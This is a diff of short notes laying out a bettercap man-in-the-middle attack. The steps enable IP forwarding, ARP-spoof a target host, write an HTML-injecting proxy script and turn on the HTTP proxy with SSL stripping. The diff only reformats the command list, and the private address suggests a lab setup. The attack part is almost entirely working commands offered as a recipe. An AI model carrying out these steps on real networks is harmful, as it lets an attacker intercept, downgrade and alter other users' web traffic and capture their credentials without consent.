@@ -1,15 +1,15 @@
 Perform ARP spoofing attack:
 
-	- sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+	sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 
-	- sudo bettercap
-	- set arp.spoof.targets 10.0.2.4
-	- set arp.spoof.fullduplex true
-	- arp.spoof on
+	sudo bettercap
+	set arp.spoof.targets 10.0.2.4
+	set arp.spoof.fullduplex true
+	arp.spoof on
 
 Create a script:
 
-	- nano myscript.py
+	nano myscript.py
 
 	function onResponse(req, res) {
 	    if( res.ContentType.indexOf('text/html') == 0 ){
@@ -25,6 +25,6 @@ Create a script:
 
 Inject the script on the proxy:
 
-	- set http.proxy.script /home/user/Desktop/myscript.py
-	- set http.proxy.sslstrip true
+	set http.proxy.script /home/user/Desktop/myscript.py
+	set http.proxy.sslstrip true
 http.proxy on
